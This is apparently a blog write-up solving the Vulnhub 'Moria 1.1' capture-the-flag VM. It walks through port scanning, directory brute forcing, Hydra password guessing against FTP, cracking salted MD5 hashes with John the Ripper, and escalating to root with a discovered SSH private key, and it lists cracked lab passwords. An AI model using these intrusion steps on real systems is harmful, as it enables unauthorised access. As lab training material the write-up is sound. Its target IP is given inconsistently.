# :game_die: Vulnhub Ctf Moria 1 1 E67Ebe70A438

---

## Step 1: Initial Enumeration

The target VM was assigned the IP `192.168.1.130`. I began with a full port scan:

```
nmap -p- -sV 192.168.8.130
```

Results:

```
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.0.8 or later
22/tcp open ssh OpenSSH 6.6.1 (protocol 2.0)
80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

Three services were exposed: FTP, SSH, and HTTP.

## Step 2: FTP Enumeration

Using `curl` against the FTP port produced: ftp 192.168.8.130

```
220 Welcome Balrog!
```

This hinted that “Balrog” could be a valid username. The *Lord of the Rings* reference to Durin’s Bane (a Balrog encountered in Moria) confirmed the theme alignment.

## Step 3: Dictionary List for Directory Brute Forcing

I generated a custom wordlist from the Balrog Wikipedia article and ran Dirb against the web service, but initially no results were found. Running DirBuster with a larger wordlist eventually uncovered:

```
/w/h/i/s/p/e/r/the_abyss/
```

This page displayed rotating text messages, many of which appeared to contain character names (e.g., Balin, Ori, Fundin). These looked like potential usernames.

## Step 4: Credential Attacks

I created username and password lists from the discovered names and attempted brute-forcing with Hydra against both FTP and SSH. Initial attempts failed.

## Get Omar Muhammed’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Recalling the FTP banner “Welcome Balrog!”, I retried with `Balrog` as the username and a password list containing *Mellon*. This was successful:

```
[21][ftp] host: 192.168.8.130 login: Balrog password: Mellon
```

SSH with the same credentials, however, returned:

```
WRONG GATE!
```

So FTP access was the intended route forward.

## Step 5: FTP Access and Web Discovery

Inside FTP, navigating to `/var/www/html/` revealed a hidden directory:

```
/QlVraKW4fbIkXau9zkAPNGzviT3UKntl/
```

Visiting this in the browser exposed a list of prisoners with passkeys. The page source provided additional hints about the format.

## Step 6: Cracking Password Hashes

The prisoner data appeared to use salted MD5 hashes. After reformatting into a John-compatible file:

```
Balin:c2d8960157fc8540f6d5d66594e165e0$6MAp84
Oin:727a279d913fba677c490102b135e51e$bQkChe
Ori:8c3c3152a5c64ffb683d78efc3520114$HnqeN4
```

I ran John the Ripper with the dynamic format:

```
john --format=dynamic_6 moriapasswords.txt
```

Recovered Credentials:

```
Balin : flower
Oin : rainbow
Ori : spanky
Maeglin : fuckoff
Nain : warrior
Dain : abcdef
Telchar : magic
Thrain : darkness
Fundin : hunter2
```

## Step 7: SSH Access

Testing these credentials against SSH, most failed. Eventually, user Ori provided access:

```
ssh Ori@192.168.8.130
```

With password `spanky`, I obtained a shell. To improve interactivity:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Step 8: Post-Exploitation Enumeration

Inside Ori’s home directory, I discovered:

```
poem.txt
.ssh/id_rsa
```

The RSA private key stood out as a possible escalation vector.

## Step 9: Privilege Escalation

>

Using the discovered `id_rsa` *Private key*, I attempted to connect to `root@127.0.0.1`:

```
ssh -i id_rsa root@127.0.0.1
```

This successfully dropped me into a root shell.

## Step 10: Capture the Flag

With root access, I located the flag in `/root/flag.txt`:

```
“All that is gold does not glitter,
Not all those who wander are lost;
The old that is strong does not wither,
Deep roots are not reached by the frost.

From the ashes a fire shall be woken,
A light from the shadows shall spring;
Renewed shall be blade that was broken,
The crownless again shall be king.”
```

---
